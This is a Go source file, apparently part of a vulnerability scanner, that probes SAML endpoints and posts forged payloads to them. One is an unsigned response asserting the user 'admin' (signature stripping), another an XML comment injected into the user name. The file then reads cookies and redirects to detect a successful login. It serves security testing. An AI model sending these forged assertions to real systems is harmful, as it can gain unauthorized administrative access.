package saml

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"github.com/areksaxyz/bhyakugan/internal/core"
)

var SAMLEndpoints = []string{
	"/saml/acs",
	"/saml2/acs",
	"/SAML2/POST",
	"/auth/saml/callback",
	"/saml/consume",
}

// Scan checks for SAML vulnerabilities
func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
	if baseURL[len(baseURL)-1] != '/' {
		baseURL += "/"
	}

	var wg sync.WaitGroup

	for _, path := range SAMLEndpoints {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			target := baseURL + strings.TrimPrefix(p, "/")
			checkSAMLEndpoint(target, client, onFound)
		}(path)
	}

	wg.Wait()
}

func checkSAMLEndpoint(target string, client *http.Client, onFound func(core.Finding)) {
	// 1. Initial Check (Does endpoint exist?)
	resp, err := client.Get(target)
	if err != nil {
		return
	}
	body, _ := io.ReadAll(io.LimitReader(io.LimitReader(resp.Body, 5*1024*1024), 5*1024*1024))
	resp.Body.Close()
	if !shouldProbeSAMLEndpoint(target, resp.StatusCode, string(body)) {
		return
	}

	// Endpoints that accept SAML usually return 405 (Method Not Allowed) or 400 on GET
	if resp.StatusCode == 405 || resp.StatusCode == 200 || resp.StatusCode == 400 {
		fmt.Printf("[*] Potential SAML Endpoint: %s\n", target)

		// 2. Test Signature Stripping (Critical Bypass)
		testSignatureStripping(target, client, onFound)

		// 3. Test XML Comment Injection
		testCommentInjection(target, client, onFound)
	}
}

func shouldProbeSAMLEndpoint(target string, statusCode int, body string) bool {
	bodyLower := strings.ToLower(body)
	bodyHasSAMLSignal := strings.Contains(bodyLower, "saml") ||
		strings.Contains(bodyLower, "assertionconsumer") ||
		strings.Contains(bodyLower, "sso")

	// 200 pages must explicitly contain SAML signals.
	if statusCode == 200 && !bodyHasSAMLSignal {
		return false
	}

	// 400/405 are often SAML endpoints expecting POST payload.
	return statusCode == 200 || statusCode == 400 || statusCode == 405
}

func testSignatureStripping(target string, client *http.Client, onFound func(core.Finding)) {
	// A basic SAML response XML without signature
	samlXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" ID="id123" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id456" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
        <saml2:Subject><saml2:NameID>admin</saml2:NameID></saml2:Subject>
        <saml2:AuthnStatement AuthnInstant="2024-01-01T00:00:00Z"><saml2:AuthnContext><saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml2:AuthnContextClassRef></saml2:AuthnContext></saml2:AuthnStatement>
    </saml2:Assertion>
	</saml2p:Response>`

	encoded := base64.StdEncoding.EncodeToString([]byte(samlXML))

	unsignedSuccess, location, cookie, finalURL, err := postSAMLResponse(target, client, encoded)
	if err != nil || !unsignedSuccess {
		return
	}

	// Control test: malformed assertion should not behave like successful auth.
	controlXML := `<not-a-saml-response>`
	controlEncoded := base64.StdEncoding.EncodeToString([]byte(controlXML))
	controlSuccess, _, _, _, controlErr := postSAMLResponse(target, client, controlEncoded)
	if controlErr == nil && controlSuccess {
		// Likely generic redirect behavior, not specific proof of signature bypass.
		return
	}

	fmt.Printf("[!] POSITIVE MATCH: SAML Signature Stripping signal at %s\n", target)
	onFound(core.Finding{
		Type:       "SAML Vulnerability",
		Target:     target,
		Detail:     fmt.Sprintf("Server accepted an unsigned SAML Response (probable signature-stripping signal).\nControl-test:passed (malformed assertion was not accepted as successful auth).\nRedirect/URL: %s\nCookie: %s\nMissing controls not yet verified: audience restriction, issuer validation, replay protection.", location+finalURL, cookie),
		Severity:   "High",
		Confidence: core.ConfidenceProbable,
	})
}

func testCommentInjection(target string, client *http.Client, onFound func(core.Finding)) {
	// SAML with Comment Injection: admin<!--comment-->@target.com
	samlXML := `<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" ID="id789" Version="2.0">
    <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="id012" Version="2.0">
        <saml2:Subject><saml2:NameID>admin<!--injection-->@local.host</saml2:NameID></saml2:Subject>
    </saml2:Assertion>
</saml2p:Response>`

	encoded := base64.StdEncoding.EncodeToString([]byte(samlXML))
	data := url.Values{}
	data.Set("SAMLResponse", encoded)

	resp, err := client.PostForm(target, data)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	// Do not report informational-only SAML probing to avoid noisy false positives.
	_ = onFound
}

func postSAMLResponse(target string, client *http.Client, encodedResponse string) (bool, string, string, string, error) {
	data := url.Values{}
	data.Set("SAMLResponse", encodedResponse)

	resp, err := client.PostForm(target, data)
	if err != nil {
		return false, "", "", "", err
	}
	defer resp.Body.Close()

	location := resp.Header.Get("Location")
	cookie := resp.Header.Get("Set-Cookie")
	finalURL := resp.Request.URL.String()
	if resp.StatusCode != 302 && resp.StatusCode != 200 {
		return false, location, cookie, finalURL, nil
	}

	return looksLikeAuthSuccess(location, finalURL, cookie), location, cookie, finalURL, nil
}

func looksLikeAuthSuccess(location, finalURL, cookie string) bool {
	joined := strings.ToLower(location + finalURL)

	hasPostAuthPath := strings.Contains(joined, "dashboard") ||
		strings.Contains(joined, "home") ||
		strings.Contains(joined, "account")
	hasAuthFailurePath := strings.Contains(joined, "login") ||
		strings.Contains(joined, "signin") ||
		strings.Contains(joined, "error") ||
		strings.Contains(joined, "fail")
	if hasPostAuthPath && !hasAuthFailurePath {
		return true
	}

	if strings.TrimSpace(cookie) == "" {
		return false
	}
	cookieLower := strings.ToLower(cookie)
	if (strings.Contains(cookieLower, "auth") || strings.Contains(cookieLower, "token")) && !hasAuthFailurePath {
		return true
	}
	return false
}
